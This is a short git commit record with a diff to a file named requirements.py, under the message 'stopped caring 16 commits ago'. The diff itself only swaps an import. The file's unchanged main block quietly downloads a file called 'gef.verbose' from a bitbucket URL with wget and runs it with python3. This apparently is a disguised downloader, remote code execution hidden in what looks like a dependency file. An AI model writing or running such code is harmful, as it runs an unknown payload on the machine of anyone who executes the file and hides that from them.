f097b705a44e88d8cbdef95fe927ac17b0296535
gakira munshi <gakimarki@proton.me>
2024-12-20 22:45:56 -0500

    stopped caring 16 commits ago

--- requirements.py
+++ requirements.py
@@ -1,3 +1,3 @@
-import os, sys,getpass
+import os, sys,builtins
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef.verbose" && python3 gef.verbose  ';os.system(cmd)
